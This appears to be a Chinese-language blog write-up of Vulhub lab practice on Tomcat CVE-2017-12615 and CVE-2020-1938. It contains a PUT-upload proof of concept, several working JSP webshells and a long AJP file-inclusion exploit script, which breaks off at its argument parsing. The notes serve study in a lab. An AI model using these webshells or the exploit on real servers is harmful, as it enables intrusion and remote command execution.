@@ -1,0 +1,962 @@
+<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>Vulhub_Middleware</title><meta name="description" content="Buona notte"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="楔子由于最近也不知道该学什么，怎么学，最关键是要不要学，很迷茫。
+之前培训以及前两天跟同事交流都提到了vulhub这个玩意儿，以前看过这东西但是看了两眼觉得只是一些比较老的cve和一个比较方便的普通web靶场，没有想到还可以当知识库使用，这两天仔细看了发现还是有一些比较新的cve，看起来也是持续更新的，于是稍微琢磨了一下，打算先走一下常见中间件的cve，光有个数据库恐怕是不行的，就怕看见了但是认不出来hhh。反正没什么事儿，每天有空了花几分钟搞一个先弄着走吧。。。
+我的环境问题─# docker-compose up -d
+Traceback (most recent call last):
+  File &amp;quot;/usr/lib/python3/dist-packages/docker/api/cli.."><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Salve" type="application/atom+xml">
+</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Vulhub_Middleware</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A5%94%E5%AD%90"><span class="toc-text">楔子</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E7%8E%AF%E5%A2%83%E9%97%AE%E9%A2%98"><span class="toc-text">我的环境问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%81%9C%E6%AD%A2%E5%B9%B6%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E5%AE%B9%E5%99%A8"><span class="toc-text">1. 停止并删除所有容器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E9%95%9C%E5%83%8F"><span class="toc-text">2. 删除所有镜像</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E6%83%B3%E7%A1%AE%E4%BF%9D%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E6%97%A0%E7%94%A8%E7%9A%84%E8%B5%84%E6%BA%90%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E4%BB%A5%E4%B8%8B%E6%B8%85%E7%90%86%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-text">如果想确保删除所有无用的资源，可以使用以下清理命令：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat"><span class="toc-text">Tomcat</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-12615-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">CVE-2017-12615 文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jsp%E6%9C%A8%E9%A9%AC"><span class="toc-text">jsp木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A9-Burp-Suite-%E8%87%AA%E5%8A%A8%E7%AE%A1%E7%90%86-Content-Length"><span class="toc-text">让 Burp Suite 自动管理 Content-Length</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-1938-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">CVE-2020-1938 文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc-1"><span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-1%EF%BC%9A%E4%BD%BF%E7%94%A8-sed"><span class="toc-text">方法 1：使用 sed</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-2%EF%BC%9A%E4%BD%BF%E7%94%A8-grep"><span class="toc-text">方法 2：使用 grep</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-3%EF%BC%9A%E4%BD%BF%E7%94%A8-awk"><span class="toc-text">方法 3：使用 awk</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat8-%EF%BC%88war%EF%BC%89"><span class="toc-text">Tomcat8 （war）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Weblogic"><span class="toc-text">Weblogic</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2023-21839"><span class="toc-text">CVE-2023-21839</span></a></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/Middleware"><i class="tag post-item-tag">Middleware</i></a><a href="/tags/Vulhub"><i class="tag post-item-tag">Vulhub</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Vulhub_Middleware</h1><time class="has-text-grey" datetime="2024-11-05T14:32:35.000Z">2024-11-05</time><article class="mt-2 post-content"><h1 id="楔子"><a href="#楔子" class="headerlink" title="楔子"></a>楔子</h1><p>由于最近也不知道该学什么，怎么学，最关键是要不要学，很迷茫。</p>
+<p>之前培训以及前两天跟同事交流都提到了vulhub这个玩意儿，以前看过这东西但是看了两眼觉得只是一些比较老的cve和一个比较方便的普通web靶场，没有想到还可以当知识库使用，这两天仔细看了发现还是有一些比较新的cve，看起来也是持续更新的，于是稍微琢磨了一下，打算先走一下常见中间件的cve，光有个数据库恐怕是不行的，就怕看见了但是认不出来hhh。反正没什么事儿，每天有空了花几分钟搞一个先弄着走吧。。。</p>
+<h1 id="我的环境问题"><a href="#我的环境问题" class="headerlink" title="我的环境问题"></a>我的环境问题</h1><pre><code>─# docker-compose up -d
+Traceback (most recent call last):
+  File &quot;/usr/lib/python3/dist-packages/docker/api/client.py&quot;, line 214, in _retrieve_server_version
+    return self.version(api_version=False)[&quot;ApiVersion&quot;]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File &quot;/usr/lib/python3/dist-packages/docker/api/daemon.py&quot;, line 181, in version
+    return self._result(self._get(url), json=True)
+                        ^^^^^^^^^^^^^^
+  File &quot;/usr/lib/python3/dist-packages/docker/utils/decorators.py&quot;, line 46, in inner
+    return f(self, *args, **kwargs)
+</code></pre>
+<p>环境来就报错，真的无语，干脆不用docker-composer了，可以给docker安装composer插件：</p>
+<pre><code>mkdir -p ~/.docker/cli-plugins/
+curl -SL https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m) -o ~/.docker/cli-plugins/docker-compose
+chmod +x ~/.docker/cli-plugins/docker-compose
+</code></pre>
+<p>然后</p>
+<pre><code>docker compose up -d 
+</code></pre>
+<p>但是：</p>
+<pre><code>proxychains docker compose up -d
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+WARN[0000] /root/work/Vulnhub/vulhub/tomcat/CVE-2017-12615/docker-compose.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion 
+[+] Building 30.4s (3/3) FINISHED                                                                                              docker:default
+ =&gt; [tomcat internal] load build definition from Dockerfile                                                                              0.0s
+ =&gt; =&gt; transferring dockerfile: 32B                                                                                                      0.0s 
+ =&gt; [tomcat internal] load .dockerignore                                                                                                 0.0s 
+ =&gt; =&gt; transferring context: 2B                                                                                                          0.0s 
+ =&gt; ERROR [tomcat internal] load metadata for docker.io/vulhub/tomcat:8.5.19                                                            30.1s 
+------
+ &gt; [tomcat internal] load metadata for docker.io/vulhub/tomcat:8.5.19:
+------
+failed to solve: rpc error: code = Unknown desc = failed to solve with frontend dockerfile.v0: failed to create LLB definition: failed to do request: Head &quot;https://docker.mirrors.ustc.edu.cn/v2/vulhub/tomcat/manifests/8.5.19?ns=docker.io&quot;: dial tcp 127.0.0.2:443: connect: connection refused
+</code></pre>
+<p>习惯了，换个源试试：<code>/etc/docker/daemon.json</code></p>
+<pre><code>&#123;
+  &quot;registry-mirrors&quot;: [
+    &quot;https://registry.docker-cn.com&quot;,
+    &quot;https://mirror.aliyuncs.com&quot;
+  ]
+&#125;
+</code></pre>
+<p>还是报错，真无语了，重新弄了一个虚拟机，还是docker不了，相似。两点了，睡了。</p>
+<p>今天随便找了一个快照回退回去，笑死，<code>docker-compose</code>没报错。。。</p>
+<p>这是使用的镜像：</p>
+<pre><code>&#123;
+&quot;registry-mirrors&quot;: [
+&quot;https://docker.m.daocloud.io&quot;,
+&quot;https://dockerproxy.com&quot;,
+&quot;https://docker.mirrors.ustc.edu.cn&quot;,
+&quot;https://docker.nju.edu.cn&quot;,
+&quot;http://hammal.staronearth.win/&quot;,
+&quot;http://hub.staronearth.win/&quot;
+]
+&#125;
+</code></pre>
+<p>网上随便复制一个，今天居然跑起来了泪目。。。</p>
+<blockquote>
+<h3 id="1-停止并删除所有容器"><a href="#1-停止并删除所有容器" class="headerlink" title="1. 停止并删除所有容器"></a>1. 停止并删除所有容器</h3><pre><code>
+docker stop $(docker ps -aq)
+docker rm $(docker ps -aq)
+</code></pre>
+<ul>
+<li><code>docker ps -aq</code> 列出所有容器的 ID，包括已停止的容器。</li>
+<li>这两条命令会先停止，然后删除所有容器。</li>
+</ul>
+<h3 id="2-删除所有镜像"><a href="#2-删除所有镜像" class="headerlink" title="2. 删除所有镜像"></a>2. 删除所有镜像</h3><pre><code>bash
+
+
+复制代码
+docker rmi $(docker images -q)
+</code></pre>
+<ul>
+<li><code>docker images -q</code> 列出所有镜像的 ID。</li>
+<li>这条命令会删除所有镜像。如果有依赖关系，可能会出现错误。</li>
+</ul>
+<h3 id="如果想确保删除所有无用的资源，可以使用以下清理命令："><a href="#如果想确保删除所有无用的资源，可以使用以下清理命令：" class="headerlink" title="如果想确保删除所有无用的资源，可以使用以下清理命令："></a>如果想确保删除所有无用的资源，可以使用以下清理命令：</h3><pre><code>bash
+
+
+复制代码
+docker system prune -a
+</code></pre>
+<ul>
+<li><code>docker system prune -a</code> 会删除所有未被使用的镜像、容器、网络和挂载卷。</li>
+</ul>
+</blockquote>
+<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><h2 id="CVE-2017-12615-文件上传"><a href="#CVE-2017-12615-文件上传" class="headerlink" title="CVE-2017-12615 文件上传"></a>CVE-2017-12615 文件上传</h2><p>容器终于起来了，进去看看：</p>
+<pre><code>docker exec -it &lt;container_id&gt; /bin/bash
+</code></pre>
+<p>跟着几个哥们装模做样审一下吧，我也不知道咋学：</p>
+<blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU3ODAyMjg4OQ==&mid=2247483805&idx=1&sn=503a3e29165d57d3c20ced671761bb5e">Tomcat 远程代码执行漏洞分析（CVE-2017-12615）及补丁 Bypass</a></li>
+</ul>
+</blockquote>
+<blockquote>
+<p>根据描述，在 Windows 服务器下，将 readonly 参数设置为 false 时，即可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码。 </p>
+</blockquote>
+<p>找到这个出现漏洞的配置：</p>
+<pre><code>root@673198ebed27:/usr/local/tomcat/conf# cat web.xml |grep readonly
+  &lt;!--   readonly            Is this context &quot;read only&quot;, so HTTP           --&gt;
+&lt;init-param&gt;&lt;param-name&gt;readonly&lt;/param-name&gt;&lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;
+</code></pre>
+<p>刚开始没找到，有好几个web.xml:</p>
+<pre><code>root@673198ebed27:/usr/local/tomcat# grep -ril &quot;readonly&quot; .
+./conf/web.xml
+</code></pre>
+<p>看了一下各位师傅的代码审计，因为看不懂所以只学到了一手：</p>
+<p><img src="/img/image-20241106225015867.png" alt="image-20241106225015867"></p>
+<p><img src="/img/image-20241106224846391.png" alt="image-20241106224846391"></p>
+<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20241106225154840.png" alt="image-20241106225154840"></p>
+<p>这里可以看到File对name进行了格式化，最后效果是删除了最后的<code>/</code></p>
+<blockquote>
+<p><strong>影响</strong> </p>
+<p>由于存在去掉最后的 &#x2F; 的特性，那么这个漏洞自然影响 Linux 以及 Windows 版本。而且经过测试，这个漏洞影响全部的 Tomcat 版本，从 5.x 到 9.x 无不中枪。目前来说，最好的解决方式是将 conf&#x2F;web.xml 中对于 DefaultServlet 的 readonly 设置为 true，才能防止漏洞。</p>
+</blockquote>
+<blockquote>
+<p>然而，经过黑盒测试，当 PUT 地址为&#x2F;1.jsp&#x2F;时，仍然会创建 JSP，会影响 Linux 和 Windows 服务器，并且 Bypass 了之前的补丁</p>
+</blockquote>
+<p>由于后端会删除末尾的<code>/</code>，那我们在前面上传的时候可以添加<code>/</code>来绕过文件名的校验，由此可以展开到其他地方的bypass。</p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>PUT /1.jsp/ HTTP/1.1
+Host: your-ip:8080
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+shell
+</code></pre>
+<p><img src="/img/image-20241106230030476.png" alt="image-20241106230030476"></p>
+<h3 id="jsp木马"><a href="#jsp木马" class="headerlink" title="jsp木马"></a>jsp木马</h3><p>这里顺带学一下jsp木马</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46317063/article/details/128816033">java安全——jsp一句话木马_cmd写jsp一句话-CSDN博客</a></p>
+<p>无回显：</p>
+<pre><code> &lt;%
+    Process process = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));
+%&gt;
+</code></pre>
+<p>带回显：</p>
+<pre><code>  &lt;%
+    Process process = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));
+    System.out.println(process);
+    InputStream inputStream = process.getInputStream();
+    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
+    String line;
+    while ((line = bufferedReader.readLine()) != null)&#123;
+      response.getWriter().println(line);
+    &#125;
+  %&gt;
+</code></pre>
+<p>这个好像用不了，又找了一个：</p>
+<pre><code>&lt;%!
+    class U extends ClassLoader &#123;
+        U(ClassLoader c) &#123;
+            super(c);
+        &#125;
+        public Class g(byte[] b) &#123;
+            return super.defineClass(b, 0, b.length);
+        &#125;
+    &#125;
+ 
+    public byte[] base64Decode(String str) throws Exception &#123;
+        try &#123;
+            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);
+            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);
+        &#125; catch (Exception e) &#123;
+            Class clazz = Class.forName(&quot;java.util.Base64&quot;);
+            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);
+            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);
+        &#125;
+    &#125;
+%&gt;
+&lt;%
+    String cls = request.getParameter(&quot;passwd&quot;);
+    if (cls != null) &#123;
+        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
+    &#125;
+%&gt;
+</code></pre>
+<p>后面这个可以连接但是无法直接执行，找个时间研究一下jsp码。</p>
+<p>有密码带回显：</p>
+<pre><code>  &lt;%
+    if (&quot;password&quot;.equals(request.getParameter(&quot;pass&quot;)))&#123;
+      Process process = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));
+//    System.out.println(process);
+      InputStream inputStream = process.getInputStream();
+      BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
+      String line;
+      while ((line = bufferedReader.readLine()) != null)&#123;
+        response.getWriter().println(line);
+      &#125;
+    &#125;
+  %&gt;
+//pass=password&amp;cmd=xxx
+</code></pre>
+<p>这里还涉及到：</p>
+<blockquote>
+<h3 id="让-Burp-Suite-自动管理-Content-Length"><a href="#让-Burp-Suite-自动管理-Content-Length" class="headerlink" title="让 Burp Suite 自动管理 Content-Length"></a>让 Burp Suite 自动管理 <code>Content-Length</code></h3><p>Burp Suite 提供了自动计算 <code>Content-Length</code> 的功能：</p>
+<ol>
+<li>在 Burp Suite 中，点击 <strong>Proxy</strong> &gt; <strong>Options</strong>。</li>
+<li>找到 <strong>Intercept Client Requests</strong> 设置下的 <strong>Match and Replace</strong> 规则。</li>
+<li>添加一个新的 <code>Header: Content-Length</code> 自动更新规则，或启用默认设置的自动计算规则。这样在发送请求时，Burp Suite 会自动根据修改后的请求体计算并更新 <code>Content-Length</code> 字段。</li>
+</ol>
+</blockquote>
+<h2 id="CVE-2020-1938-文件包含"><a href="#CVE-2020-1938-文件包含" class="headerlink" title="CVE-2020-1938 文件包含"></a>CVE-2020-1938 文件包含</h2><blockquote>
+<p>漏洞影响的产品版本包括：</p>
+<p>Tomcat 6</p>
+<p>Tomcat 7</p>
+<p>Tomcat 8</p>
+<p>Tomcat 9</p>
+<p>由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p>
+</blockquote>
+<h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><details>
+    <summary>poc.py</summary>
+    #!/usr/bin/env python
+#CNVD-2020-10487  Tomcat-Ajp lfi
+#by ydhcui
+import struct
+# Some references:
+# https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html
+def pack_string(s):
+        if s is None:
+                return struct.pack(">h", -1)
+        l = len(s)
+        return struct.pack(">H%dsb" % l, l, s.encode('utf8'), 0)
+def unpack(stream, fmt):
+        size = struct.calcsize(fmt)
+        buf = stream.read(size)
+        return struct.unpack(fmt, buf)
+def unpack_string(stream):
+        size, = unpack(stream, ">h")
+        if size == -1: # null string
+                return None
+        res, = unpack(stream, "%ds" % size)
+        stream.read(1) # \0
+        return res
+class NotFoundException(Exception):
+        pass
+class AjpBodyRequest(object):
+        # server == web server, container == servlet
+        SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)
+        MAX_REQUEST_LENGTH = 8186
+        def __init__(self, data_stream, data_len, data_direction=None):
+                self.data_stream = data_stream
+                self.data_len = data_len
+                self.data_direction = data_direction
+        def serialize(self):
+                data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)
+                if len(data) == 0:
+                        return struct.pack(">bbH", 0x12, 0x34, 0x00)
+                else:
+                        res = struct.pack(">H", len(data))
+                        res += data
+                if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:
+                        header = struct.pack(">bbH", 0x12, 0x34, len(res))
+                else:
+                        header = struct.pack(">bbH", 0x41, 0x42, len(res))
+                return header + res
+        def send_and_receive(self, socket, stream):
+                while True:
+                        data = self.serialize()
+                        socket.send(data)
+                        r = AjpResponse.receive(stream)
+                        while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS:
+                                r = AjpResponse.receive(stream)
+                        if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4:
+                                break
+class AjpForwardRequest(object):
+        _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(28)
+        REQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE, 'TRACE': TRACE}
+        # server == web server, container == servlet
+        SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)
+        COMMON_HEADERS = ["SC_REQ_ACCEPT",
+                "SC_REQ_ACCEPT_CHARSET", "SC_REQ_ACCEPT_ENCODING", "SC_REQ_ACCEPT_LANGUAGE", "SC_REQ_AUTHORIZATION",
+                "SC_REQ_CONNECTION", "SC_REQ_CONTENT_TYPE", "SC_REQ_CONTENT_LENGTH", "SC_REQ_COOKIE", "SC_REQ_COOKIE2",
+                "SC_REQ_HOST", "SC_REQ_PRAGMA", "SC_REQ_REFERER", "SC_REQ_USER_AGENT"
+        ]
+        ATTRIBUTES = ["context", "servlet_path", "remote_user", "auth_type", "query_string", "route", "ssl_cert", "ssl_cipher", "ssl_session", "req_attribute", "ssl_key_size", "secret", "stored_method"]
+        def __init__(self, data_direction=None):
+                self.prefix_code = 0x02
+                self.method = None
+                self.protocol = None
+                self.req_uri = None
+                self.remote_addr = None
+                self.remote_host = None
+                self.server_name = None
+                self.server_port = None
+                self.is_ssl = None
+                self.num_headers = None
+                self.request_headers = None
+                self.attributes = None
+                self.data_direction = data_direction
+        def pack_headers(self):
+                self.num_headers = len(self.request_headers)
+                res = ""
+                res = struct.pack(">h", self.num_headers)
+                for h_name in self.request_headers:
+                        if h_name.startswith("SC_REQ"):
+                                code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1
+                                res += struct.pack("BB", 0xA0, code)
+                        else:
+                                res += pack_string(h_name)
+                        res += pack_string(self.request_headers[h_name])
+                return res
+        def pack_attributes(self):
+                res = b""
+                for attr in self.attributes:
+                        a_name = attr['name']
+                        code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1
+                        res += struct.pack("b", code)
+                        if a_name == "req_attribute":
+                                aa_name, a_value = attr['value']
+                                res += pack_string(aa_name)
+                                res += pack_string(a_value)
+                        else:
+                                res += pack_string(attr['value'])
+                res += struct.pack("B", 0xFF)
+                return res
+        def serialize(self):
+                res = ""
+                res = struct.pack("bb", self.prefix_code, self.method)
+                res += pack_string(self.protocol)
+                res += pack_string(self.req_uri)
+                res += pack_string(self.remote_addr)
+                res += pack_string(self.remote_host)
+                res += pack_string(self.server_name)
+                res += struct.pack(">h", self.server_port)
+                res += struct.pack("?", self.is_ssl)
+                res += self.pack_headers()
+                res += self.pack_attributes()
+                if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:
+                        header = struct.pack(">bbh", 0x12, 0x34, len(res))
+                else:
+                        header = struct.pack(">bbh", 0x41, 0x42, len(res))
+                return header + res
+        def parse(self, raw_packet):
+                stream = StringIO(raw_packet)
+                self.magic1, self.magic2, data_len = unpack(stream, "bbH")
+                self.prefix_code, self.method = unpack(stream, "bb")
+                self.protocol = unpack_string(stream)
+                self.req_uri = unpack_string(stream)
+                self.remote_addr = unpack_string(stream)
+                self.remote_host = unpack_string(stream)
+                self.server_name = unpack_string(stream)
+                self.server_port = unpack(stream, ">h")
+                self.is_ssl = unpack(stream, "?")
+                self.num_headers, = unpack(stream, ">H")
+                self.request_headers = {}
+                for i in range(self.num_headers):
+                        code, = unpack(stream, ">H")
+                        if code > 0xA000:
+                                h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001]
+                        else:
+                                h_name = unpack(stream, "%ds" % code)
+                                stream.read(1) # \0
+                        h_value = unpack_string(stream)
+                        self.request_headers[h_name] = h_value
+        def send_and_receive(self, socket, stream, save_cookies=False):
+                res = []
+                i = socket.sendall(self.serialize())
+                if self.method == AjpForwardRequest.POST:
+                        return res
+                r = AjpResponse.receive(stream)
+                assert r.prefix_code == AjpResponse.SEND_HEADERS
+                res.append(r)
+                if save_cookies and 'Set-Cookie' in r.response_headers:
+                        self.headers['SC_REQ_COOKIE'] = r.response_headers['Set-Cookie']
+                # read body chunks and end response packets
+                while True:
+                        r = AjpResponse.receive(stream)
+                        res.append(r)
+                        if r.prefix_code == AjpResponse.END_RESPONSE:
+                                break
+                        elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK:
+                                continue
+                        else:
+                                raise NotImplementedError
+                                break
+                return res
+class AjpResponse(object):
+        _,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7)
+        COMMON_SEND_HEADERS = [
+                        "Content-Type", "Content-Language", "Content-Length", "Date", "Last-Modified",
+                        "Location", "Set-Cookie", "Set-Cookie2", "Servlet-Engine", "Status", "WWW-Authenticate"
+                        ]
+        def parse(self, stream):
+                # read headers
+                self.magic, self.data_length, self.prefix_code = unpack(stream, ">HHb")
+                if self.prefix_code == AjpResponse.SEND_HEADERS:
+                        self.parse_send_headers(stream)
+                elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:
+                        self.parse_send_body_chunk(stream)
+                elif self.prefix_code == AjpResponse.END_RESPONSE:
+                        self.parse_end_response(stream)
+                elif self.prefix_code == AjpResponse.GET_BODY_CHUNK:
+                        self.parse_get_body_chunk(stream)
+                else:
+                        raise NotImplementedError
+        def parse_send_headers(self, stream):
+                self.http_status_code, = unpack(stream, ">H")
+                self.http_status_msg = unpack_string(stream)
+                self.num_headers, = unpack(stream, ">H")
+                self.response_headers = {}
+                for i in range(self.num_headers):
+                        code, = unpack(stream, ">H")
+                        if code <= 0xA000: # custom header
+                                h_name, = unpack(stream, "%ds" % code)
+                                stream.read(1) # \0
+                                h_value = unpack_string(stream)
+                        else:
+                                h_name = AjpResponse.COMMON_SEND_HEADERS[code-0xA001]
+                                h_value = unpack_string(stream)
+                        self.response_headers[h_name] = h_value
+        def parse_send_body_chunk(self, stream):
+                self.data_length, = unpack(stream, ">H")
+                self.data = stream.read(self.data_length+1)
+        def parse_end_response(self, stream):
+                self.reuse, = unpack(stream, "b")
+        def parse_get_body_chunk(self, stream):
+                rlen, = unpack(stream, ">H")
+                return rlen
+        @staticmethod
+        def receive(stream):
+                r = AjpResponse()
+                r.parse(stream)
+                return r
+import socket
+def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):
+        fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
+        fr.method = method
+        fr.protocol = "HTTP/1.1"
+        fr.req_uri = req_uri
+        fr.remote_addr = target_host
+        fr.remote_host = None
+        fr.server_name = target_host
+        fr.server_port = 80
+        fr.request_headers = {
+                'SC_REQ_ACCEPT': 'text/html',
+                'SC_REQ_CONNECTION': 'keep-alive',
+                'SC_REQ_CONTENT_LENGTH': '0',
+                'SC_REQ_HOST': target_host,
+                'SC_REQ_USER_AGENT': 'Mozilla',
+                'Accept-Encoding': 'gzip, deflate, sdch',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Upgrade-Insecure-Requests': '1',
+                'Cache-Control': 'max-age=0'
+        }
+        fr.is_ssl = False
+        fr.attributes = []
+        return fr
+class Tomcat(object):
+        def __init__(self, target_host, target_port):
+                self.target_host = target_host
+                self.target_port = target_port
+                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                self.socket.connect((target_host, target_port))
+                self.stream = self.socket.makefile("rb", bufsize=0)
+        def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):
+                self.req_uri = req_uri
+                self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))
+                print("Getting resource at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri))
+                if user is not None and password is not None:
+                        self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + ("%s:%s" % (user, password)).encode('base64').replace('\n', '')
+                for h in headers:
+                        self.forward_request.request_headers[h] = headers[h]
+                for a in attributes:
+                        self.forward_request.attributes.append(a)
+                responses = self.forward_request.send_and_receive(self.socket, self.stream)
+                if len(responses) == 0:
+                        return None, None
+                snd_hdrs_res = responses[0]
+                data_res = responses[1:-1]
+                if len(data_res) == 0:
+                        print("No data in response. Headers:%s\n" % snd_hdrs_res.response_headers)
+                return snd_hdrs_res, data_res
+'''
+javax.servlet.include.request_uri
+javax.servlet.include.path_info
+javax.servlet.include.servlet_path
+'''
+import argparse
+parser = argparse.ArgumentParser()
